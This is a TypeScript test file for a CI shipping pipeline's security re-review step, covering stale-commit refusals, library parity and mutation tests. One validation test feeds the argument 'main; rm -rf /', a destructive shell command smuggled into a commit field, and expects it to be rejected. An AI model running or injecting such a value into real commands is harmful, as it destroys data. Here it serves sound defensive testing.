    for (const budget of [undefined, null, -1, 1.5, NaN, "2", {}]) {
      const run = reReviewRun({ budget });
      const out = await run.result;
      expect(out?.status, `a budget of ${JSON.stringify(budget)} was waved through`).toBe(
        "SHIP_FAILED",
      );
      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
      expect(run.calls).toEqual([]);
    }
  });

  test("an unusable pair of commits is stale, and nothing is spawned", async () => {
    // A re-review has to be aimed at a commit. "HEAD" is what made the #129
    // diff empty, and a missing testedSha gives the re-review no base.
    for (const [tested, head] of [
      [SHA, "HEAD"], [SHA, ""], [SHA, undefined], [SHA, null],
      ["HEAD", OTHER_SHA], ["", OTHER_SHA], [undefined, OTHER_SHA], [{}, OTHER_SHA],
    ] as Array<[unknown, unknown]>) {
      const run = reReviewRun({ tested, head });
      const out = await run.result;
      expect(
        out?.status,
        `tested=${JSON.stringify(tested)} head=${JSON.stringify(head)} was waved through`,
      ).toBe("SHIP_FAILED");
      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
      expect(run.calls, "a re-review was aimed at something that is not a commit").toEqual([]);
    }
  });

  test("a completed re-review moves the commit the Ship-round check compares", async () => {
    // The Ship-round block reads `testedSha`. If the Verify-side loop left it
    // naming the commit the FIRST review read, a later round would be measured
    // against a review two commits old and the refusal would quote the wrong
    // one. The loop writes the result back, so "what was last reviewed" has
    // one meaning in both checks.
    const run = reReviewRun({ tested: SHA, head: OTHER_SHA });
    expect(await run.result).toBeUndefined();
    expect(run.scope.testedSha, "the reviewed commit did not move with the re-review").toBe(
      OTHER_SHA.toLowerCase(),
    );
    // And a run that re-reviewed nothing leaves it exactly where it was.
    const untouched = reReviewRun({ tested: SHA, head: SHA });
    await untouched.result;
    expect(untouched.scope.testedSha).toBe(SHA);
  });

  test("the Ship-round refusal is untouched and still names SECURITY_REVIEW_STALE", async () => {
    // The second currency check, after recommit-ship, is the other half of
    // #169. #171 does not loosen it: a Ship-round remediation that moves the
    // branch past the review still ends the run there.
    const out = await runMarkedBlock(
      STALE_REFUSAL_BLOCK,
      shipRoundScope([], { tested: "3fe336f1", commitSha: OTHER_SHA }),
    );
    expect(out?.status).toBe("SHIP_FAILED");
    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
  });

  test("a rook FAIL is still read before any of this", async () => {
    // The re-review loop must not run ahead of the verdict refusal: a FAIL
    // that got re-reviewed into a PASS would be #129 with extra steps.
    const run = reReviewRun({
      overrides: {
        securityVerdict: { spawned: true, verdict: "FAIL", failures: ["guard bypass"] },
      },
    });
    const out = await run.result;
    expect(out?.status).toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("guard bypass");
    expect(run.calls, "a failing review was re-reviewed instead of refused").toEqual([]);
  });

  test("both refusal names are in the file, and the exhaustion one is spelled once", () => {
    expect((shipSource.match(/SECURITY_REVIEW_STALE/g) || []).length).toBeGreaterThanOrEqual(2);
    expect(
      (shipSource.match(/'SECURITY_REREVIEW_EXHAUSTED'/g) || []).length,
      "the exhaustion name is written as a literal more than once in ship.js",
    ).toBe(1);
  });

  test("no branch turns the re-review decision into a log line the run continues past", () => {
    // The cheap version of #171 — re-review, then carry on regardless of what
    // it said — is #129 rewritten with one more agent in it.
    expect(
      shipSource.match(/reReviewOutcome\.decision\s*===\s*RE_REVIEW\s*\?/g) || [],
      "ship.js decides the re-review through a ternary",
    ).toEqual([]);
    expect(shipSource.match(/[Cc]urrency\.current\s*\?/g) || []).toEqual([]);
  });
});

describe("#171 parity: the inlined re-review decision matches the library", () => {
  for (const [label, currency, spent, cap, expected] of REREVIEW_MATRIX) {
    test(`agrees on ${label}`, () => {
      expect(inlinedReReview.reReviewDecision(currency, spent, cap), `drift at ${label}`).toEqual(
        reReviewDecision(currency, spent, cap),
      );
      expect(inlinedReReview.reReviewDecision(currency, spent, cap).decision).toBe(expected);
    });
  }

  test("the three verdict constants are spelled the same in both", () => {
    expect(inlinedReReview.REVIEW_CURRENT).toBe(REVIEW_CURRENT);
    expect(inlinedReReview.RE_REVIEW).toBe(RE_REVIEW);
    expect(inlinedReReview.SECURITY_REREVIEW_EXHAUSTED).toBe(SECURITY_REREVIEW_EXHAUSTED);
  });

  test("rookScopeCommand agrees about a base too", () => {
    expect(inlined.rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", SHA)).toBe(
      rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", SHA),
    );
    expect(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json")).toBe(
      rookScopeCommand("/p", "/h", SHA, "/w/s.json"),
    );
    for (const bad of ["HEAD", "origin/main", "main; rm -rf /"]) {
      expect(() => inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json", bad)).toThrow(
        /not a commit SHA/i,
      );
    }
  });

  test("the re-review calls no security helper the library does not export", () => {
    // Parity's "every". The matrices above compare the four helpers that have
    // a counterpart; a new inlined `rookSomething` used only by the re-review
    // would have nothing to be compared against, and every one of them would
    // go on passing while the uncompared one drifted — which is exactly how
    // computeACHash's extracted copy came to differ from the inlined one.
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    const exported = new Set([...lib.matchAll(/export function ([A-Za-z0-9_]+)/g)].map(m => m[1]));
    expect(exported.size, "lib/security-verdict.ts exports nothing").toBeGreaterThan(0);

    const reviewing =
      sliceBlock(SPAWN_START, SPAWN_END) + sliceBlock(DECISION_START, DECISION_END);
    const called = new Set(
      [...reviewing.matchAll(/\b((?:rook|review)[A-Za-z0-9_]*)\s*\(/g)].map(m => m[1]),
    );
    expect(called.size, "the re-review path calls no security helper at all").toBeGreaterThan(0);
    for (const name of called) {
      expect(
        exported.has(name),
        `the re-review calls ${name}(), which lib/security-verdict.ts does not export — ` +
          `nothing compares it against anything`,
      ).toBe(true);
    }
  });

  test("the library still exports each of the four exactly once", () => {
    // A second `export function rookReviewSha` would make which one the
    // matrices import an ordering detail, and the inlined copy could agree
    // with a definition production never calls.
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    for (const name of ["rookReviewSha", "rookScopeCommand", "rookGateVerdict", "reviewIsCurrent"]) {
      expect(
        (lib.match(new RegExp(`export function ${name}\\b`, "g")) || []).length,
        `lib/security-verdict.ts does not export ${name} exactly once`,
      ).toBe(1);
    }
  });
});

// ── #171 AC-6: the re-review spawn is removed, and the run is watched ───

/**
 * The one call the mutation removes.
 *
 * Declared as a literal rather than built by regex so that renaming it in
 * ship.js aborts this file instead of quietly mutating nothing — the same
 * property `test/suite-binding-mutation.test.ts` asserts for its own binding.
 */
const REREVIEW_SPAWN =
  "const reReviewed = await runRookReview({ sha: reReviewTarget, base: reviewedBase, round: reReviewRounds })";

function decisionBlockWithoutSpawn(): string {
  const block = sliceBlock(DECISION_START, DECISION_END);
  const occurrences = block.split(REREVIEW_SPAWN).length - 1;
  if (occurrences !== 1) {
    throw new Error(
      `could not build the mutant: the re-review spawn appears ${occurrences} times, expected exactly 1. ` +
        `Either it was renamed, or a second copy exists and removing one would leave the other reviewing.`,
    );
  }
  return block.replace(
    REREVIEW_SPAWN,
    "const reReviewed = undefined // MUTANT: the re-review spawn is removed",
  );
}

describe("#171 AC-6: removing the re-review makes the run refuse, never ship", () => {
  /** The remediate-then-ship case, run over an arbitrary copy of the block. */
  async function remediateThenShip(block: string) {
    const logs: string[] = [];
    const calls: ReReviewCall[] = [];
    const out = await runMarkedBlock(
      block,
      decisionScope(logs, {
        tested: "c5ebc2a4",
        head: OTHER_SHA,
        MAX_SECURITY_REREVIEWS: 2,
        runRookReview: async (call: ReReviewCall) => {
          calls.push(call);
          return {
            verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
            testedSha: call.sha,
          };
        },
        recordExhaustedSecurityReview: async () => {},
      }),
    );
    return { out, calls, logs };
  }

  test("the real block ships it", async () => {
    const real = await remediateThenShip(sliceBlock(DECISION_START, DECISION_END));
    expect(real.out, "the real source refused a run its re-review passed").toBeUndefined();
    expect(real.calls.length).toBe(1);
  });

  test("the mutant refuses it, rather than shipping unreviewed code", async () => {
    // The whole of AC-6: short-circuit the spawn and the remediate-then-ship
    // case above goes red — and it goes red by REFUSING, not by shipping a
    // commit nothing reviewed. A mutation that made the run ship anyway would
    // mean the spawn was never what the fall-through depended on.
    const mutant = await remediateThenShip(decisionBlockWithoutSpawn());
    expect(
      mutant.out?.status,
      "with the re-review removed the run still reached the PR step",
    ).toBe("SHIP_FAILED");
    expect(mutant.calls, "the mutant spawned a review anyway").toEqual([]);
  });

  test("the mutation harness aborts when the spawn is renamed", () => {
    // A harness that silently no-ops when its target moves is the decorative
    // check .claude/rules/checks-must-be-able-to-fail.md is about.
    expect(() => {
      const block = sliceBlock(DECISION_START, DECISION_END);
      const renamed = block.replace(REREVIEW_SPAWN, "const reReviewed = await somethingElse()");
      const occurrences = renamed.split(REREVIEW_SPAWN).length - 1;
      if (occurrences !== 1) throw new Error("could not build the mutant");
      return renamed;
    }).toThrow(/could not build the mutant/);
  });

  test("the loop and the refusal are each one marked, reachable region", () => {
    for (const marker of [
      "// ──── REREVIEW-LOOP-START ────",
      "// ──── REREVIEW-LOOP-END ────",
      "// ──── STALE-OR-EXHAUSTED-START ────",
      "// ──── STALE-OR-EXHAUSTED-END ────",
    ]) {
      expect(
        (shipSource.match(new RegExp(marker.replace(/[|\\{}()[\]^$+*?.]/g, "\\$&"), "g")) || []).length,
        `${marker} does not appear exactly once`,
      ).toBe(1);
    }
    expect(assertMarkedBlockReachable(shipSource, "REREVIEW-LOOP")).toEqual(["Program"]);
    expect(assertMarkedBlockReachable(shipSource, "STALE-OR-EXHAUSTED")).toEqual(["Program"]);
    expect(assertMarkedBlockReachable(shipSource, "ROOK-REVIEW-SPAWN")).toEqual(["Program"]);
  });
});

// ── fan-out harness shared by the AC-2 and AC-4 tests ───────────────────

/**
 * ship.js's own `shellQuote`, extracted rather than reimplemented.
 *
 * The fan-out block quotes the paths it hands to the record step, and a stub
 * that quoted differently from production would make these tests agree with
 * something that does not run. Extraction also fails loudly if the function is
 * renamed, instead of silently testing a local copy of the old one.
 */
const shellQuote: (word: unknown) => string = (() => {
  const match = shipSource.match(/function shellQuote\(word\) \{[\s\S]*?\n\}/);
  if (!match) {
    throw new Error("ship.js no longer defines shellQuote(word) — this harness extracts it by name");
  }
  return new Function(`${match[0]}\nreturn shellQuote`)();
})();

function runFanout(opts: { rook?: unknown; scope?: unknown } = {}) {
  const block = sliceBlock(FANOUT_START, FANOUT_END);
  const labels: string[] = [];
  const prompts: string[] = [];
  const logs: string[] = [];

  const factory = new Function(
    "log", "timedAgent", "briefedAgent", "parallel", "discovery", "projectConfig",
    "PROJECT_ROOT", "HARNESS_ROOT", "WORK_DIR", "ISSUE", "GATE_RESULT_SCHEMA",
    "reviewSha", "rookScopeCommand", "rookGateVerdict", "securityVerdict",
    "shellQuote",
    `return (async () => {${block}})()`,
  );

  const done = factory(
    (m: unknown) => logs.push(String(m)),
    async (p: string, o: { label: string }) => {
      labels.push(o.label);
      prompts.push(p);
      if (o.label === "rook-scope") return opts.scope ?? GOOD_SCOPE;
      return {};
    },
    async (p: string, o: { label: string }) => {
      labels.push(o.label);
      prompts.push(p);
      return o.label === "rook" ? (opts.rook ?? { result: "PASS" }) : { result: "PASS" };
    },
    (thunks: Array<() => Promise<unknown>>) => Promise.all(thunks.map(t => t())),
    { ceremonyTier: "LIGHT", acs: [], filesToModify: ["lib/a.ts"] },
    { container: null },
    REPO_ROOT, REPO_ROOT, "/tmp/work", 129, {},
    SHA,
    inlined.rookScopeCommand,
    inlined.rookGateVerdict,
    { spawned: false, verdict: "FAIL", failures: ["the security review did not run"] },
    shellQuote,
  ) as Promise<void>;

  return { done, labels, prompts, logs };
}

async function runFanoutPrompts(): Promise<string[]> {
  const { done, prompts } = runFanout();
  await done;
  return prompts;
}
